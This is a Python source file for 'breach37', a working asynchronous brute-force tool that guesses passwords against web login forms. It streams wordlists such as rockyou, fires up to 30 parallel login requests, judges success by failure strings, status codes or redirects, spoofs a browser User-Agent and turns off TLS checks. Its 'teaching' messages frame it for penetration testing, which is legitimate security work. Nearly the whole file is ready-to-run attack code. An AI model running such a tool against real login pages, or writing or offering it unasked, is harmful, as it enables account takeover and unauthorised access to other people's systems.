"""breach37 engine — async HTTP form brute forcer."""
from __future__ import annotations

import asyncio
import json
import sys
import time
from dataclasses import dataclass, field, asdict
from pathlib import Path
from typing import AsyncIterator

import httpx

from intercept37.brute.presets import PRESETS, resolve_wordlist


@dataclass
class BruteResult:
    """Result of a brute force run."""
    success: bool = False
    username: str = ""
    password: str | None = None
    url: str = ""
    attempts: int = 0
    duration: float = 0.0
    speed: float = 0.0  # attempts per second
    status_code: int | None = None
    redirect_url: str | None = None
    error: str | None = None
    teaching: str = ""

    def to_json(self) -> str:
        return json.dumps(asdict(self), indent=2)

    def to_human(self) -> str:
        lines = []
        if self.success:
            lines.append(f"\033[92m[+] PASSWORD FOUND: {self.password}\033[0m")
            lines.append(f"    Username: {self.username}")
            lines.append(f"    URL: {self.url}")
            if self.status_code:
                lines.append(f"    Status: {self.status_code}")
            if self.redirect_url:
                lines.append(f"    Redirect: {self.redirect_url}")
        else:
            lines.append("\033[91m[-] No password found.\033[0m")
            if self.error:
                lines.append(f"    Error: {self.error}")
        lines.append(f"    Attempts: {self.attempts}")
        lines.append(f"    Duration: {self.duration:.1f}s")
        lines.append(f"    Speed: {self.speed:.0f} req/s")
        if self.teaching:
            lines.append(f"\n\033[93m[i] {self.teaching}\033[0m")
        return "\n".join(lines)


async def _load_wordlist(path: str) -> AsyncIterator[str]:
    """Stream passwords from a wordlist file."""
    resolved = resolve_wordlist(path)
    p = Path(resolved)
    if not p.exists():
        raise FileNotFoundError(
            f"Wordlist not found: {resolved}\n"
            f"  Fix: Install it with 'apt install wordlists' or 'apt install seclists',\n"
            f"  or provide the full path to your wordlist file."
        )
    with open(p, "r", encoding="latin-1") as f:
        for line in f:
            word = line.rstrip("\n\r")
            if word:
                yield word


class HttpBrute:
    """Async HTTP form brute forcer.

    Usage:
        result = await HttpBrute(
            url="http://target/login",
            username="admin",
            wordlist="rockyou.txt",
            fail_string="Invalid"
        ).run()
    """

    def __init__(
        self,
        url: str,
        username: str,
        wordlist: str = "rockyou",
        fail_string: str | None = None,
        fail_code: int | None = None,
        fail_redirect: str | None = None,
        method: str = "POST",
        username_field: str = "username",
        password_field: str = "password",
        extra_fields: dict | None = None,
        cookies: dict | None = None,
        headers: dict | None = None,
        concurrency: int = 30,
        rate_limit: float = 0.0,
        timeout: float = 10.0,
        preset: str | None = None,
        verbose: bool = False,
    ):
        # If preset provided, merge its defaults
        if preset and preset in PRESETS:
            p = PRESETS[preset]
            base_url = url.rstrip("/")
            self.url = base_url + p["login_path"]
            self.method = p["method"]
            self.username_field = p["username_field"]
            self.password_field = p["password_field"]
            self.extra_fields = {**p.get("extra_fields", {}), **(extra_fields or {})}
            self.cookies = {**p.get("cookies", {}), **(cookies or {})}
            self.fail_string = fail_string or p.get("fail_string")
        else:
            self.url = url
            self.method = method.upper()
            self.username_field = username_field
            self.password_field = password_field
            self.extra_fields = extra_fields or {}
            self.cookies = cookies or {}
            self.fail_string = fail_string

        self.username = username
        self.wordlist = wordlist
        self.fail_code = fail_code
        self.fail_redirect = fail_redirect
        self.headers = headers or {}
        self.concurrency = concurrency
        self.rate_limit = rate_limit
        self.timeout = timeout
        self.verbose = verbose

        # State
        self._found: str | None = None
        self._attempts = 0
        self._lock = asyncio.Lock()
        self._start_time = 0.0

    def explain(self) -> str:
        """Return a human-readable explanation of what this brute force will do."""
        lines = [
            f"I'm going to send {self.method} requests to {self.url}",
            f"  with {self.username_field}={self.username} and passwords from '{self.wordlist}'.",
            f"  Concurrency: {self.concurrency} parallel requests.",
        ]
        if self.fail_string:
            lines.append(
                f"  I'll know a password works when the response does NOT contain '{self.fail_string}'."
            )
        if self.fail_code:
            lines.append(
                f"  I'll know a password works when the status code is NOT {self.fail_code}."
            )
        if self.fail_redirect:
            lines.append(
                f"  I'll know a password works when the response does NOT redirect to '{self.fail_redirect}'."
            )
        if not self.fail_string and not self.fail_code and not self.fail_redirect:
            lines.append(
                "  WARNING: No failure detection set. I'll compare response sizes to detect success."
            )
        if self.rate_limit > 0:
            lines.append(f"  Rate limited to {self.rate_limit:.1f}s between requests per worker.")
        if self.cookies:
            lines.append(f"  Sending cookies: {list(self.cookies.keys())}")
        if self.extra_fields:
            lines.append(f"  Extra form fields: {list(self.extra_fields.keys())}")
        return "\n".join(lines)

    async def _try_password(
        self, client: httpx.AsyncClient, password: str, semaphore: asyncio.Semaphore
    ) -> bool:
        """Try a single password. Returns True if found."""
        if self._found:
            return False

        async with semaphore:
            if self._found:
                return False

            if self.rate_limit > 0:
                await asyncio.sleep(self.rate_limit)

            form_data = {
                self.username_field: self.username,
                self.password_field: password,
                **self.extra_fields,
            }

            try:
                if self.method == "POST":
                    resp = await client.post(
                        self.url, data=form_data, follow_redirects=False
                    )
                else:
                    resp = await client.get(
                        self.url, params=form_data, follow_redirects=False
                    )
            except (httpx.ConnectError, httpx.TimeoutException) as e:
                if self.verbose:
                    print(f"  [!] Connection error on '{password}': {e}", file=sys.stderr)
                return False

            async with self._lock:
                self._attempts += 1
                if self._attempts % 100 == 0:
                    elapsed = time.time() - self._start_time
                    speed = self._attempts / elapsed if elapsed > 0 else 0
                    print(
                        f"  [{self._attempts}] Trying... ({speed:.0f} req/s)",
                        file=sys.stderr,
                    )

            # Check if this password succeeded
            is_failure = False

            if self.fail_string:
                body = resp.text
                if self.fail_string in body:
                    is_failure = True

            if self.fail_code:
                if resp.status_code == self.fail_code:
                    is_failure = True

            if self.fail_redirect:
                location = resp.headers.get("location", "")
                if self.fail_redirect in location:
                    is_failure = True

            # If no detection method set, assume non-fail_string means we need at least one method
            if not self.fail_string and not self.fail_code and not self.fail_redirect:
                # Heuristic: 302 redirect to non-login page = success
                if resp.status_code in (200,):
                    is_failure = True  # 200 on login page usually means failure
                elif resp.status_code in (302, 301):
                    location = resp.headers.get("location", "")
                    if "login" in location.lower() or "error" in location.lower():
                        is_failure = True
                    # else: redirect away from login = probable success

            if not is_failure:
                async with self._lock:
                    if not self._found:
                        self._found = password
                        redirect = resp.headers.get("location", "")
                        print(
                            f"\n  \033[92m[+] FOUND: {password}\033[0m (status={resp.status_code}, redirect={redirect})",
                            file=sys.stderr,
                        )
                return True

            return False

    async def run(self) -> BruteResult:
        """Execute the brute force attack."""
        self._start_time = time.time()
        self._attempts = 0
        self._found = None

        print(f"  [*] Target: {self.url}", file=sys.stderr)
        print(f"  [*] Username: {self.username}", file=sys.stderr)
        print(f"  [*] Wordlist: {self.wordlist}", file=sys.stderr)
        print(f"  [*] Concurrency: {self.concurrency}", file=sys.stderr)

        semaphore = asyncio.Semaphore(self.concurrency)

        async with httpx.AsyncClient(
            timeout=httpx.Timeout(self.timeout),
            cookies=self.cookies,
            headers={
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
                **self.headers,
            },
            follow_redirects=False,
            verify=False,
        ) as client:
            # Initial connectivity check
            try:
                test_resp = await client.get(self.url.rsplit("/", 1)[0] + "/", follow_redirects=True)
                print(f"  [*] Target reachable (status={test_resp.status_code})", file=sys.stderr)
            except Exception as e:
                return BruteResult(
                    success=False,
                    username=self.username,
                    url=self.url,
                    error=f"Cannot reach target: {e}. Check URL and network connectivity.",
                )

            tasks = []
            try:
                async for password in _load_wordlist(self.wordlist):
                    if self._found:
                        break
                    tasks.append(
                        asyncio.create_task(self._try_password(client, password, semaphore))
                    )
                    # Batch to avoid memory explosion on huge wordlists
                    if len(tasks) >= self.concurrency * 10:
                        await asyncio.gather(*tasks)
                        tasks = []

                if tasks:
                    await asyncio.gather(*tasks)

            except FileNotFoundError as e:
                return BruteResult(
                    success=False,
                    username=self.username,
                    url=self.url,
                    error=str(e),
                )

        duration = time.time() - self._start_time
        speed = self._attempts / duration if duration > 0 else 0

        if self._found:
            teaching = (
                f"The password '{self._found}' worked for user '{self.username}'. "
                f"This means the application doesn't have account lockout or rate limiting "
                f"(we tried {self._attempts} passwords). In a real engagement, report this as: "
                f"'No brute-force protection on login form at {self.url}'."
            )
        else:
            teaching = (
                f"None of the {self._attempts} passwords worked. The password might not be "
                f"in this wordlist, or the failure detection might be wrong. Try: "
                f"1) A different wordlist, 2) Check the fail_string by manually submitting "
                f"a wrong password and looking at the response."
            )

        return BruteResult(
            success=self._found is not None,
            username=self.username,
            password=self._found,
            url=self.url,
            attempts=self._attempts,
            duration=round(duration, 2),
            speed=round(speed, 1),
            teaching=teaching,
        )
